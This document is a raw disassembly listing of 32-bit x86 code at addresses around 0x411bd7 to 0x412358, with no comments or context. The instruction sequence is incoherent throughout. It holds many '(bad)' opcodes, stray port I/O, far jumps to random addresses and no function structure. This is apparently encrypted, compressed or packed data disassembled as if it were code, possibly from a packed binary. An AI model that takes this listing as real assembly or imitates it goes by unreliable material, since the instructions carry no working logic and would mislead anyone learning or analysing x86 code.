  411bd7:	ins    BYTE PTR es:[edi],dx
  411bd8:	xchg   ebp,eax
  411bd9:	fist   WORD PTR [esi+0x69589420]
  411bdf:	push   ss
  411be0:	scas   al,BYTE PTR es:[edi]
  411be1:	pop    esi
  411be2:	retf   0x9b17
  411be5:	add    DWORD PTR [ecx],esi
  411be7:	xor    eax,0x25f7ec0b
  411bec:	(bad)  
  411bee:	in     eax,0xa7
  411bf0:	pop    ebx
  411bf1:	popa   
  411bf2:	xchg   ecx,eax
  411bf3:	(bad)  
  411bf4:	aaa    
  411bf5:	push   edx
  411bf6:	gs push 0xffffff8d
  411bf9:	dec    eax
  411bfa:	and    eax,0xf1cbf69d
  411bff:	aad    0x2
  411c01:	ficomp WORD PTR [esi]
  411c03:	xor    ecx,DWORD PTR [eax+0x6b61af48]
  411c09:	lea    edx,[ecx]
  411c0b:	dec    edx
  411c0c:	mov    bl,0x88
  411c0e:	cmp    ebp,edx
  411c10:	xor    eax,0x39440756
  411c15:	ja     0x411c76
  411c17:	test   al,0x48
  411c19:	ja     0x411bcb
  411c1b:	retf   0x837b
  411c1e:	mov    ch,0x53
  411c20:	(bad)  
  411c21:	retf   0xca9d
  411c24:	in     al,0xcb
  411c26:	push   ss
  411c27:	cli    
  411c28:	cli    
  411c29:	pop    esp
  411c2a:	sar    DWORD PTR ds:0xaa9cd61a,0x76
  411c31:	sahf   
  411c32:	call   0x5e7001b8
  411c37:	mov    ecx,0xfc813594
  411c3c:	loope  0x411c22
  411c3e:	dec    esi
  411c3f:	add    BYTE PTR [edx+0x42],bh
  411c42:	addr16 mov ds:0x4212,al
  411c46:	cs inc edx
  411c48:	or     eax,0x8565f84a
  411c4d:	adc    eax,0xee19feea
  411c52:	jnp    0x411bde
  411c54:	jbe    0x411c67
  411c56:	lods   al,BYTE PTR ds:[esi]
  411c57:	xchg   ebp,eax
  411c58:	sub    eax,0xef0cfbca
  411c5d:	push   ebp
  411c5e:	es loope 0x411cbe
  411c61:	add    bh,bl
  411c63:	scas   eax,DWORD PTR es:[edi]
  411c64:	fsub   DWORD PTR [ebx]
  411c66:	cli    
  411c67:	jne    0x411c82
  411c69:	xchg   BYTE PTR gs:[ebx],bl
  411c6c:	dec    edi
  411c6d:	nop
  411c6e:	cwde   
  411c6f:	das    
  411c70:	ss pop ebp
  411c72:	sbb    al,0x7
  411c74:	loopne 0x411c82
  411c76:	mov    dh,0x2e
  411c78:	push   es
  411c79:	lea    esp,[edx+0x35]
  411c7c:	fdivr  QWORD PTR [edi-0x4a]
  411c7f:	or     BYTE PTR [edi+0x20fe894a],cl
  411c85:	aas    
  411c86:	out    dx,al
  411c87:	sub    ebp,DWORD PTR [ebx]
  411c89:	sbb    eax,0xf475d39f
  411c8e:	mov    ecx,0x19f85845
  411c93:	sub    ebp,ebx
  411c95:	cs cmp al,0xcb
  411c98:	lds    ecx,FWORD PTR [edx]
  411c9a:	sbb    al,0xf7
  411c9c:	mov    ds:0x76565e11,al
  411ca1:	out    0x17,eax
  411ca3:	jmp    0x4703ef96
  411ca8:	jno    0x411cce
  411caa:	mov    esi,DWORD PTR [esi+0x75]
  411cad:	iret   
  411cae:	out    dx,al
  411caf:	cli    
  411cb0:	inc    edi
  411cb1:	dec    ebx
  411cb2:	push   esi
  411cb3:	rol    ebx,1
  411cb5:	xchg   esi,eax
  411cb6:	loop   0x411d1f
  411cb8:	test   al,0xb9
  411cba:	mov    es,WORD PTR [ebp+0x626f6fd2]
  411cc0:	jnp    0x411c44
  411cc2:	icebp  
  411cc3:	inc    esi
  411cc4:	xchg   edx,eax
  411cc5:	mov    ebp,0x1a01d53f
  411cca:	sbb    al,0xe2
  411ccc:	xchg   esi,eax
  411ccd:	cmp    edx,esp
  411ccf:	add    al,0x13
  411cd1:	cmc    
  411cd2:	lods   al,BYTE PTR ds:[esi]
  411cd3:	cwde   
  411cd4:	mov    dh,0x36
  411cd6:	mov    ecx,eax
  411cd8:	jo     0x411cfb
  411cda:	mov    ds:0x4d169759,al
  411cdf:	sbb    eax,0x3b056ebb
  411ce4:	mov    al,0xf7
  411ce6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ce7:	retf   0xa0c4
  411cea:	cdq    
  411ceb:	push   edx
  411cec:	test   BYTE PTR [ebx],0xaf
  411cef:	aad    0xf7
  411cf1:	mov    bl,0x79
  411cf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411cf4:	ins    DWORD PTR es:[edi],dx
  411cf5:	shl    DWORD PTR [edi-0x25],1
  411cf8:	and    DWORD PTR [edx-0x49e1bf5d],edx
  411cfe:	cmp    al,0xb6
  411d00:	stos   BYTE PTR es:[edi],al
  411d01:	and    eax,0x214015d8
  411d06:	add    eax,0x66f0da82
  411d0b:	(bad)  
  411d0c:	mul    dl
  411d0e:	popa   
  411d0f:	sbb    al,0x28
  411d11:	and    cl,cl
  411d13:	lahf   
  411d14:	and    dh,BYTE PTR [esi]
  411d16:	in     eax,dx
  411d17:	sub    ecx,ecx
  411d19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d1a:	fadd   st,st(4)
  411d1c:	outs   dx,BYTE PTR ds:[esi]
  411d1d:	or     bl,BYTE PTR [eax-0x726eee84]
  411d23:	out    dx,al
  411d24:	cmp    al,0xf2
  411d26:	xchg   DWORD PTR ds:0x1d81ac24,ecx
  411d2c:	push   esp
  411d2d:	test   al,0x67
  411d2f:	xor    ebx,DWORD PTR [edi]
  411d31:	jp     0x411d62
  411d33:	outs   dx,BYTE PTR ds:[esi]
  411d34:	add    BYTE PTR [eax+0xc],cl
  411d37:	push   ds
  411d38:	leave  
  411d39:	mov    esp,0x53a880ea
  411d3e:	sti    
  411d3f:	fild   QWORD PTR [edx]
  411d41:	dec    edi
  411d42:	es call 0x9374:0xe2f64f9b
  411d4a:	inc    ebx
  411d4b:	mov    ds:0x5f23b8fc,al
  411d50:	out    0x17,al
  411d52:	and    DWORD PTR [ecx+0xf1b7027],0xfffffff5
  411d59:	js     0x411d83
  411d5b:	mov    dh,0x3c
  411d5d:	lock dec ebp
  411d5f:	mov    ds:0xa0cf9dab,al
  411d64:	sti    
  411d65:	test   al,0x39
  411d67:	push   edx
  411d68:	jecxz  0x411d9e
  411d6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d6b:	mov    al,ds:0x56f9c020
  411d70:	stos   DWORD PTR es:[edi],eax
  411d71:	fmul   QWORD PTR [esi+0x2d]
  411d74:	adc    esp,0xffffffee
  411d77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d78:	add    bl,0xaf
  411d7b:	out    0x1f,al
  411d7d:	sbb    DWORD PTR [ebx-0x65],ecx
  411d80:	nop
  411d81:	cli    
  411d82:	out    0x10,al
  411d84:	rol    al,0xb
  411d87:	int    0xd6
  411d89:	sbb    bh,dl
  411d8b:	push   ecx
  411d8c:	mov    ah,0xb5
  411d8e:	or     al,0x18
  411d90:	(bad)  
  411d91:	and    ebp,DWORD PTR [ebx]
  411d93:	iret   
  411d94:	pop    ds
  411d95:	das    
  411d96:	jns    0x411dd4
  411d98:	fstp   DWORD PTR [esi+0x64]
  411d9b:	xlat   BYTE PTR ds:[ebx]
  411d9c:	popa   
  411d9d:	sub    BYTE PTR [ecx-0x302d99a3],dh
  411da3:	cdq    
  411da4:	dec    ecx
  411da5:	cs loop 0x411d2c
  411da8:	push   edi
  411da9:	stos   BYTE PTR es:[edi],al
  411daa:	loope  0x411e18
  411dac:	sbb    BYTE PTR [edx+eiz*8],0xfc
  411db0:	lock mov bl,0xbf
  411db3:	or     BYTE PTR [ebx],dh
  411db5:	xor    dl,BYTE PTR [edi+0x7d2d3d09]
  411dbb:	pop    ecx
  411dbc:	(bad)  
  411dbe:	leave  
  411dbf:	sti    
  411dc0:	repnz sbb ch,ch
  411dc3:	add    eax,0xbb53eae2
  411dc8:	scas   al,BYTE PTR es:[edi]
  411dc9:	jge    0x411df5
  411dcb:	adc    al,0x9e
  411dcd:	lock repnz mov ecx,0x8571c7e
  411dd4:	mov    edx,0x86cc833b
  411dd9:	int    0xbc
  411ddb:	xlat   BYTE PTR ds:[ebx]
  411ddc:	loope  0x411e3f
  411dde:	mov    ds:0x3386b4a6,eax
  411de3:	and    BYTE PTR [ecx],bl
  411de5:	sub    ch,BYTE PTR [edi+eiz*8]
  411de8:	sub    DWORD PTR [eax],0x9
  411deb:	cmp    al,BYTE PTR ds:0x9b8d2bb9
  411df1:	push   edi
  411df2:	mov    cl,BYTE PTR [ecx-0x5e]
  411df5:	sbb    BYTE PTR [edx],bl
  411df7:	fist   DWORD PTR [ecx-0x537a4ff6]
  411dfd:	sub    esi,esi
  411dff:	(bad)  
  411e00:	not    DWORD PTR [ebx+0x20]
  411e03:	sbb    bh,al
  411e05:	imul   eax,DWORD PTR [eax-0x2e],0x5ddaaceb
  411e0c:	aam    0xb4
  411e0e:	or     al,0x57
  411e10:	fld    QWORD PTR [ebx+0x2815437]
  411e16:	inc    eax
  411e17:	push   esi
  411e18:	and    al,0x97
  411e1a:	in     al,dx
  411e1b:	cmp    ebx,DWORD PTR [esi-0xdfc6d02]
  411e21:	xor    eax,0xd207a88e
  411e26:	adc    eax,DWORD PTR [edi]
  411e28:	pop    ss
  411e29:	xor    al,0x74
  411e2b:	sub    BYTE PTR [ebp-0x49],bl
  411e2e:	dec    edi
  411e2f:	pop    ecx
  411e30:	enter  0xed0c,0xc2
  411e34:	xor    eax,0x2e4f2286
  411e39:	cli    
  411e3a:	pop    ecx
  411e3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e3c:	je     0x411dec
  411e3e:	int3   
  411e3f:	and    DWORD PTR [edi-0x1a],ebx
  411e42:	jnp    0x411e09
  411e44:	add    eax,0x8b3da64e
  411e49:	inc    ebx
  411e4a:	call   0xec55:0x8c32d731
  411e51:	sar    BYTE PTR [esi+0x21],1
  411e54:	xchg   DWORD PTR [edx+0x4b],ebx
  411e57:	jae    0x411dee
  411e59:	test   ebp,ecx
  411e5b:	leave  
  411e5c:	(bad)  
  411e5d:	cmc    
  411e5e:	std    
  411e5f:	lods   al,BYTE PTR ds:[esi]
  411e60:	xchg   ebp,eax
  411e61:	out    dx,al
  411e62:	fiadd  DWORD PTR ds:0xfbf2d859
  411e68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e69:	test   DWORD PTR [ebx],0x45a5ab2
  411e6f:	pop    ebx
  411e70:	sbb    BYTE PTR [esi-0x7b935506],0x95
  411e77:	sbb    DWORD PTR [ebx],ecx
  411e79:	scas   eax,DWORD PTR es:[edi]
  411e7a:	pop    ebx
  411e7b:	xor    BYTE PTR [edi],0x6f
  411e7e:	pusha  
  411e7f:	or     al,0x20
  411e81:	sub    al,dl
  411e83:	in     eax,dx
  411e84:	icebp  
  411e85:	in     al,0xc7
  411e87:	(bad)  
  411e88:	mov    edx,0xf7e07a40
  411e8d:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  411e8f:	je     0x411ef1
  411e91:	mov    al,ds:0xa81d59ca
  411e96:	jb     0x411e34
  411e98:	adc    al,0xb2
  411e9a:	sub    cl,BYTE PTR [esi+0x75]
  411e9d:	lds    edi,FWORD PTR ds:0xdc0ae62c
  411ea3:	out    dx,al
  411ea4:	add    ch,bh
  411ea6:	imul   ebp,ebx,0xf56ce03b
  411eac:	push   eax
  411ead:	nop
  411eae:	popa   
  411eaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411eb0:	dec    ecx
  411eb1:	test   DWORD PTR [edx],edx
  411eb3:	xor    eax,0x852cdc4b
  411eb8:	(bad)  
  411eb9:	loopne 0x411f24
  411ebb:	inc    edx
  411ebc:	and    eax,0x512883d9
  411ec1:	iret   
  411ec2:	inc    edi
  411ec3:	adc    DWORD PTR [edx-0x235f36f3],ecx
  411ec9:	and    DWORD PTR [edi],edi
  411ecb:	inc    ebx
  411ecc:	loopne 0x411ed5
  411ece:	fcmovne st,st(5)
  411ed0:	mov    ah,0xa6
  411ed2:	cld    
  411ed3:	hlt    
  411ed4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ed5:	dec    esi
  411ed6:	xchg   dl,bh
  411ed8:	xchg   esi,eax
  411ed9:	sbb    ecx,DWORD PTR [eax+0x5]
  411edc:	add    al,0x98
  411ede:	addr16 dec esi
  411ee0:	sub    al,0xd6
  411ee2:	push   eax
  411ee3:	loop   0x411eb1
  411ee5:	adc    DWORD PTR [eax+0x32],esi
  411ee8:	inc    edx
  411ee9:	jo     0x411ed8
  411eeb:	adc    ch,BYTE PTR [ecx-0x76]
  411eee:	outs   dx,BYTE PTR ds:[esi]
  411eef:	frstor [edx-0x6ec36307]
  411ef5:	dec    edi
  411ef6:	iret   
  411ef7:	scas   al,BYTE PTR es:[edi]
  411ef8:	out    dx,eax
  411ef9:	inc    edx
  411efa:	stc    
  411efb:	inc    edx
  411efc:	jmp    0xabfc:0xa10d5b8f
  411f03:	iret   
  411f04:	mov    esi,0x4c2290cb
  411f09:	ins    DWORD PTR es:[edi],dx
  411f0a:	or     eax,0xa837ba8c
  411f0f:	push   0xffffff82
  411f11:	arpl   WORD PTR [ebx+0x2e],di
  411f14:	jne    0x411e98
  411f16:	pop    ss
  411f17:	mov    edx,gs
  411f19:	loopne 0x411eb7
  411f1b:	arpl   sp,di
  411f1d:	in     al,dx
  411f1e:	or     eax,0xfadd00bf
  411f23:	inc    edx
  411f24:	and    DWORD PTR [ecx-0x67],eax
  411f27:	stos   DWORD PTR es:[edi],eax
  411f28:	xchg   edx,eax
  411f29:	cld    
  411f2a:	aad    0x2a
  411f2c:	nop    DWORD PTR [ebx+ebx*8]
  411f30:	add    ch,cl
  411f32:	inc    esi
  411f33:	add    dx,WORD PTR [ebp+0x6dea4d1e]
  411f3a:	(bad)  
  411f3b:	stc    
  411f3c:	inc    esi
  411f3d:	xor    BYTE PTR [ebx-0x56],dl
  411f40:	sbb    DWORD PTR [ebp-0x1eabf40d],edi
  411f46:	call   0xc60b21f6
  411f4b:	inc    eax
  411f4c:	and    bl,BYTE PTR [edi+esi*2]
  411f4f:	sub    eax,0x2d850377
  411f54:	js     0x411fb3
  411f56:	pop    ebx
  411f57:	mov    ds:0xa1ccd4b,al
  411f5c:	addr16 cmp edx,edi
  411f5f:	cmp    eax,0xe3fd8a66
  411f64:	stos   DWORD PTR es:[edi],eax
  411f65:	jmp    0xfd14e865
  411f6a:	cmp    esi,DWORD PTR [ecx-0x24]
  411f6d:	xchg   edx,eax
  411f6e:	lods   eax,DWORD PTR ds:[esi]
  411f6f:	inc    edi
  411f70:	out    dx,eax
  411f71:	std    
  411f72:	int    0x7a
  411f74:	f2xm1  
  411f76:	xor    DWORD PTR [ebp+0x5fc3f074],0xe0e31ea1
  411f80:	jo     0x411fbf
  411f82:	std    
  411f83:	fisubr DWORD PTR [ecx-0x62]
  411f86:	scas   eax,DWORD PTR es:[edi]
  411f87:	mov    bh,0x10
  411f89:	icebp  
  411f8a:	or     esp,DWORD PTR ds:0x7bab3859
  411f90:	sbb    al,0xac
  411f92:	mov    esp,DWORD PTR [edx-0x4]
  411f95:	pushf  
  411f96:	or     dl,ch
  411f98:	and    ebp,DWORD PTR ds:0xda75275f
  411f9e:	pop    ebp
  411f9f:	push   ss
  411fa0:	jnp    0x411f3f
  411fa2:	repz inc esp
  411fa4:	add    DWORD PTR [eax],eax
  411fa6:	adc    cl,al
  411fa8:	lahf   
  411fa9:	xor    ch,BYTE PTR [ebx-0x5f2790a7]
  411faf:	cwde   
  411fb0:	mov    ah,0x2
  411fb2:	and    edx,DWORD PTR [edi]
  411fb4:	hlt    
  411fb5:	call   0x1850820e
  411fba:	pop    ss
  411fbb:	xor    dh,bl
  411fbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fbe:	adc    DWORD PTR [ecx-0x654cc498],edi
  411fc4:	out    dx,eax
  411fc5:	stc    
  411fc6:	lea    esi,[eax-0x49]
  411fc9:	sbb    DWORD PTR [ebp+0x4a],ecx
  411fcc:	mov    ah,0x77
  411fce:	sbb    al,0x8c
  411fd0:	sbb    dl,dl
  411fd2:	push   0x14
  411fd4:	xchg   ebp,eax
  411fd5:	in     eax,0x17
  411fd7:	mov    cl,0x10
  411fd9:	mov    si,0x377a
  411fdd:	jnp    0x411f9f
  411fdf:	outs   dx,BYTE PTR ds:[esi]
  411fe0:	sar    BYTE PTR [ebp+0x36],cl
  411fe3:	popa   
  411fe4:	rcl    bh,0x7d
  411fe7:	pop    eax
  411fe8:	or     DWORD PTR [ebx-0x2c],0xffffff96
  411fec:	icebp  
  411fed:	sub    ah,bh
  411fef:	fldenv [ecx+0x219e68f8]
  411ff5:	ds sbb eax,0x3ad3c2fd
  411ffb:	fstp   TBYTE PTR [edx+0x2f]
  411ffe:	mov    ch,0xc6
  412000:	xchg   BYTE PTR [edi],dh
  412002:	mov    bh,0xad
  412004:	push   esi
  412005:	push   ss
  412006:	outs   dx,BYTE PTR ds:[esi]
  412008:	(bad)  
  412009:	mov    ebp,0x234ecba5
  41200e:	xchg   DWORD PTR [ecx-0x54],ebp
  412011:	popa   
  412012:	ret    
  412013:	inc    ebp
  412014:	scas   eax,DWORD PTR es:[edi]
  412015:	fs inc esi
  412017:	cdq    
  412018:	dec    esi
  412019:	xchg   edx,eax
  41201a:	adc    DWORD PTR [eax-0x59],ebp
  41201d:	mov    ds:0xbfe679a8,al
  412022:	xchg   edi,eax
  412023:	sub    dl,dl
  412025:	mov    es,WORD PTR [ecx+0x4ea7a916]
  41202b:	add    eax,0x877cdded
  412030:	neg    DWORD PTR [ebx+0x6df74645]
  412036:	lods   eax,DWORD PTR ds:[esi]
  412037:	add    DWORD PTR [esi+0x7c],edx
  41203a:	test   eax,0x444f1a05
  41203f:	sti    
  412040:	retf   
  412041:	and    cl,0x36
  412044:	push   ebx
  412045:	sub    eax,edx
  412047:	loopne 0x41200b
  412049:	jmp    0xd940:0x34e428f4
  412050:	in     al,0x5
  412052:	not    DWORD PTR [edi+ebp*2+0x69]
  412056:	sub    DWORD PTR [edi],edi
  412058:	and    al,0xd1
  41205a:	xor    ebx,ebp
  41205c:	ins    BYTE PTR es:[edi],dx
  41205d:	xor    esp,DWORD PTR [edx-0x6a675316]
  412063:	add    BYTE PTR [edx-0x15c7dab9],ah
  412069:	pop    eax
  41206a:	xor    al,0xfd
  41206c:	push   0x5f
  41206e:	mov    cs,WORD PTR [eax+edx*2]
  412071:	les    esi,FWORD PTR [edx+eax*8+0x557a74e2]
  412078:	mov    dh,BYTE PTR [eax+0x18]
  41207b:	push   ebx
  41207c:	test   esi,ecx
  41207e:	fld    QWORD PTR [ebx-0x35707e0e]
  412084:	cli    
  412085:	push   ebp
  412086:	repz test eax,0xc24cc05d
  41208c:	dec    ecx
  41208d:	in     eax,0x15
  41208f:	imul   ebx,DWORD PTR [ebx-0x6944660d],0xc51be5d7
  412099:	mov    ebp,0x9aad08b1
  41209e:	imul   ecx,DWORD PTR gs:[ebx+ecx*8],0xffffffd2
  4120a3:	fwait
  4120a4:	xchg   esp,eax
  4120a5:	sub    ebp,DWORD PTR [edi+0x5fd0f3bb]
  4120ab:	test   al,0xf4
  4120ad:	repz jge 0x412069
  4120b0:	jae    0x4120ff
  4120b2:	xor    ecx,DWORD PTR [edi]
  4120b4:	fadd   DWORD PTR [eax]
  4120b6:	lods   al,BYTE PTR ds:[esi]
  4120b7:	repz adc ebx,DWORD PTR [ebx+eiz*8]
  4120bb:	cld    
  4120bc:	jmp    0x34ce:0xa69c3cd7
  4120c3:	dec    ebx
  4120c4:	les    edi,FWORD PTR [ecx+0x18f33535]
  4120ca:	add    al,0x64
  4120cc:	sbb    ah,BYTE PTR [ebx+ecx*4+0x41]
  4120d0:	fld    DWORD PTR [esi]
  4120d2:	mov    esi,0x6ee7f0dd
  4120d7:	pop    esp
  4120d8:	es dec ecx
  4120da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120db:	add    al,cl
  4120dd:	stos   DWORD PTR es:[edi],eax
  4120de:	jno    0x4120c0
  4120e0:	mov    edi,edi
  4120e2:	jmp    0x5d46:0xd98b48e2
  4120e9:	jbe    0x412139
  4120eb:	mov    edx,DWORD PTR [eax-0x63]
  4120ee:	out    dx,al
  4120ef:	lea    eax,[esi]
  4120f1:	cdq    
  4120f2:	out    dx,eax
  4120f3:	std    
  4120f4:	pop    eax
  4120f5:	bound  eax,QWORD PTR [ebp-0x70]
  4120f8:	pushf  
  4120f9:	adc    eax,0xda2ddb9d
  4120fe:	cmp    eax,0x49f1a5e6
  412103:	sbb    BYTE PTR [esi],ch
  412105:	jb     0x4120ed
  412107:	les    ecx,FWORD PTR [ebp-0x15bd239]
  41210d:	test   DWORD PTR ds:0xbc5c198d,0xb0a687eb
  412117:	scas   eax,DWORD PTR es:[edi]
  412118:	repnz pop esp
  41211a:	sub    dh,BYTE PTR [ecx+0x3602be72]
  412120:	xchg   ebx,eax
  412121:	loop   0x4121a2
  412123:	lock lds ebx,FWORD PTR [esi-0x45143193]
  41212a:	retf   0x1e5d
  41212d:	xor    eax,0x28a5e3bf
  412132:	nop
  412133:	mov    al,ds:0xa03446d3
  412138:	sahf   
  412139:	fld1   
  41213b:	and    edx,0x6d
  41213e:	and    BYTE PTR [edx+0x6feb4f82],ah
  412144:	scas   al,BYTE PTR es:[edi]
  412145:	cwde   
  412146:	sub    ebx,DWORD PTR [ecx+0x3a]
  412149:	and    cl,BYTE PTR [ecx+0x18]
  41214c:	lahf   
  41214d:	jae    0x412198
  41214f:	dec    eax
  412150:	inc    esi
  412151:	out    0x64,eax
  412153:	xor    eax,0xd9e306fc
  412158:	pop    ecx
  412159:	in     eax,dx
  41215a:	sbb    DWORD PTR [edx-0x62],eax
  41215d:	sbb    BYTE PTR [eax],ch
  41215f:	mov    dh,0x79
  412161:	test   BYTE PTR [ebp+0x2f],ch
  412164:	cmp    eax,0x135ca8b2
  412169:	ds pop esp
  41216b:	jb     0x412186
  41216d:	addr16 loope 0x4121a6
  412170:	xchg   esp,eax
  412171:	lea    esi,[edi-0x469063a3]
  412177:	add    DWORD PTR [eax+0x65],esi
  41217a:	lods   al,BYTE PTR ds:[esi]
  41217b:	inc    esi
  41217c:	stc    
  41217d:	dec    ebx
  41217e:	push   cs
  41217f:	sbb    DWORD PTR gs:[ebx-0x19],ebx
  412183:	cmp    ebp,DWORD PTR [esi]
  412185:	mov    WORD PTR [edi-0x5a],cs
  412188:	and    al,0x21
  41218a:	aas    
  41218b:	das    
  41218c:	mov    eax,0x15334aa6
  412191:	in     eax,0x8
  412193:	jp     0x4121b2
  412195:	loope  0x41211e
  412197:	sub    esp,DWORD PTR [eax]
  412199:	cdq    
  41219a:	mov    ebx,0xddbc8252
  41219f:	sbb    al,0x9e
  4121a1:	pop    edi
  4121a2:	ins    BYTE PTR es:[edi],dx
  4121a3:	ss popf 
  4121a5:	push   ecx
  4121a6:	jmp    0x34eed216
  4121ab:	inc    esi
  4121ac:	leave  
  4121ad:	js     0x41214a
  4121af:	fcomp  QWORD PTR [edi]
  4121b1:	mov    eax,ds:0xcf0ec2e6
  4121b6:	hlt    
  4121b7:	sbb    eax,ebp
  4121b9:	and    ecx,eax
  4121bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121bc:	aam    0xd
  4121be:	bound  ecx,QWORD PTR [edi-0x5c]
  4121c1:	push   edx
  4121c2:	inc    eax
  4121c3:	cmp    bh,BYTE PTR [edx+0x11]
  4121c6:	jnp    0x41219a
  4121c8:	aaa    
  4121c9:	sar    BYTE PTR [esi-0x50d9037e],cl
  4121cf:	in     eax,0xb2
  4121d1:	inc    edx
  4121d2:	mov    ch,0x3a
  4121d4:	mov    dl,0xd
  4121d6:	xchg   edi,eax
  4121d7:	dec    ebp
  4121d8:	addr16 jp 0x412173
  4121db:	push   esi
  4121dc:	cmp    DWORD PTR [esi-0x61],esi
  4121df:	or     dh,BYTE PTR [edx]
  4121e1:	jge    0x412180
  4121e3:	retf   0x9bf3
  4121e6:	add    BYTE PTR ds:0x5a107471,bl
  4121ec:	xchg   ebx,eax
  4121ed:	fwait
  4121ee:	and    al,0x19
  4121f0:	sbb    esp,DWORD PTR [edi]
  4121f2:	push   0x318895de
  4121f7:	add    al,BYTE PTR [esi]
  4121f9:	adc    BYTE PTR [ebx-0x10],bh
  4121fc:	les    edi,FWORD PTR [ebx]
  4121fe:	dec    edi
  4121ff:	out    dx,eax
  412200:	shr    DWORD PTR [ecx-0x3f],cl
  412203:	xchg   esp,eax
  412204:	add    eax,0x9d1a67af
  412209:	inc    esp
  41220a:	push   cs
  41220b:	push   edi
  41220c:	jnp    0x41226a
  41220e:	and    ecx,DWORD PTR [ebx-0x58]
  412211:	inc    edx
  412212:	dec    ecx
  412213:	xor    BYTE PTR [edi-0x54],cl
  412216:	jmp    0x4121d9
  412218:	mov    edx,0x450fa293
  41221d:	scas   al,BYTE PTR es:[edi]
  41221e:	repz mov dl,0xc4
  412221:	in     eax,dx
  412222:	xchg   BYTE PTR [esi+0x76f426b9],ah
  412228:	ins    BYTE PTR es:[edi],dx
  412229:	(bad)  
  41222a:	out    0x6a,eax
  41222c:	pop    ss
  41222d:	pusha  
  41222e:	in     eax,dx
  41222f:	rcl    dh,cl
  412231:	jns    0x412216
  412233:	js     0x41223e
  412235:	nop
  412236:	ss retf 0x1870
  41223a:	js     0x412282
  41223c:	xchg   esi,eax
  41223d:	out    dx,eax
  41223e:	sub    BYTE PTR [esi-0x736a7a94],ch
  412244:	dec    ebx
  412245:	outs   dx,BYTE PTR ds:[esi]
  412246:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412247:	pop    edx
  412248:	or     esi,DWORD PTR ds:[edi]
  41224b:	in     eax,0x9
  41224d:	pop    eax
  41224e:	loop   0x4121fd
  412250:	cmp    al,0x1f
  412252:	cmp    BYTE PTR [ebx+0x5e],dh
  412255:	push   edi
  412256:	pop    ebx
  412257:	int3   
  412258:	call   0x93339719
  41225d:	adc    al,0x9e
  41225f:	xchg   ebp,eax
  412260:	mov    esp,0x8e3e2a69
  412265:	fnsave es:[edi+0x24d838b0]
  41226c:	and    BYTE PTR [ecx-0x775bfba9],cl
  412272:	fninit 
  412274:	in     al,dx
  412275:	in     eax,dx
  412276:	dec    esi
  412277:	cwde   
  412278:	adc    al,0x4c
  41227a:	adc    DWORD PTR [eax],edi
  41227c:	push   es
  41227d:	jmp    0xc3f2:0x3bc45618
  412284:	aad    0x60
  412286:	mov    al,ds:0x3af5774a
  41228b:	gs mov esi,0xe1ec3887
  412291:	jb     0x412280
  412293:	fnstenv [edi+0x76e79497]
  412299:	mov    BYTE PTR [ecx+0x55491144],bl
  41229f:	inc    edi
  4122a0:	(bad)  
  4122a1:	retf   
  4122a2:	je     0x412248
  4122a4:	into   
  4122a5:	scas   eax,DWORD PTR es:[edi]
  4122a6:	popf   
  4122a7:	sbb    eax,DWORD PTR [eax+0x74557a74]
  4122ad:	xchg   BYTE PTR [edx],ah
  4122af:	xchg   esi,eax
  4122b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122b1:	add    ch,ch
  4122b3:	loopne 0x412285
  4122b5:	call   0xd7f0479a
  4122ba:	jne    0x412305
  4122bc:	dec    esi
  4122bd:	mov    dl,0x1b
  4122bf:	pusha  
  4122c0:	push   esi
  4122c1:	inc    esi
  4122c2:	xchg   esi,eax
  4122c3:	sub    edx,DWORD PTR [ebx-0x57]
  4122c6:	sub    ah,BYTE PTR [eax-0x3d0f6dca]
  4122cc:	imul   DWORD PTR [edi+esi*2+0x51]
  4122d0:	(bad)  
  4122d1:	cld    
  4122d2:	sti    
  4122d3:	rcr    bl,0x82
  4122d6:	mov    cl,0xa4
  4122d8:	mov    esp,0x2ae7928c
  4122dd:	or     ch,al
  4122df:	push   ebp
  4122e0:	fild   WORD PTR [edi+0x34c80d4d]
  4122e6:	pop    ds
  4122e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122e8:	jge    0x412298
  4122ea:	(bad)  
  4122eb:	mov    eax,0x9d7730d4
  4122f0:	das    
  4122f1:	add    eax,0x4ec099c3
  4122f6:	mov    esi,DWORD PTR [esi+edi*2-0x5bb5325b]
  4122fd:	inc    esi
  4122fe:	jb     0x412350
  412300:	inc    edx
  412301:	rcl    BYTE PTR [edi+0x18],1
  412304:	push   ebx
  412305:	iret   
  412306:	imul   DWORD PTR [eax+0x110ff519]
  41230c:	cld    
  41230d:	xchg   esp,eax
  41230e:	dec    ebx
  41230f:	push   0x0
  412311:	inc    esi
  412312:	pusha  
  412313:	(bad)  
  412314:	hlt    
  412315:	or     al,0xdb
  412317:	inc    esi
  412318:	in     al,dx
  412319:	lahf   
  41231a:	in     al,dx
  41231b:	cmc    
  41231c:	call   0xa45e:0x9d0d8fb8
  412323:	stc    
  412324:	xchg   BYTE PTR [edi+0x5f],ah
  412327:	pop    ecx
  412328:	xlat   BYTE PTR ds:[ebx]
  412329:	or     dh,BYTE PTR [ebx-0x60]
  41232c:	jmp    0x412389
  41232e:	cmp    BYTE PTR [ebx-0x68],cl
  412331:	mov    cl,0x2f
  412333:	cmp    eax,0x4f08003c
  412338:	idiv   DWORD PTR ds:0xa1319435
  41233e:	ds inc esi
  412340:	xchg   bl,dh
  412342:	and    bl,BYTE PTR [ebx+0x53fa6b28]
  412348:	cwde   
  412349:	nop
  41234a:	add    DWORD PTR [ebp-0x15],esi
  41234d:	inc    edx
  41234e:	sub    DWORD PTR [esi+0x6eb33a81],ecx
  412354:	test   cl,dl
  412356:	test   al,0x1a
  412358:	pop    eax
